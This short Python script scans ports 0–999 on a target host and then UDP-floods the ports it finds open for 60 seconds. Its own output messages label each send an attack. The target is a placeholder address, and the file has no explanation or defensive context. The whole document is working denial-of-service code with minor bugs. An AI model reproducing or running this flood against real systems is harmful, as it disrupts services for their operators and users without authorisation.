import time
import socket
import random

def scan_ports(ip):
    t_ip = socket.gethostbyname(ip)
    print('Starting scan on host: ', t_ip)
    port_list = []

    for i in range(0, 1000):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        conn = s.connect_ex((t_ip, i))
        if conn == 0:
            print('Port %d: OPEN' % (i,))
            port_list.append(i)
        s.close()

    return port_list

def udpflood(target, target_ports, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    byts = bytes(random.randrange(0, 1024))
    timeout = time.time() + duration
    sent = 0
    p = 0

    while 1:
        if time.time() > timeout: #timeout
            break
        else:
            pass

        client.sendto(byts, (target, target_ports[p]))
        sent = sent + 1
        p = p + 1
        if p == len(target_ports):
            p = 0
            
        print("Attacking %s sent packages %s at the port %s " % (sent, target, target_ports[p]))


targ = "0.0.0.0"
ports = scan_ports(targ)
dur = 60

udpflood(targ, ports, dur)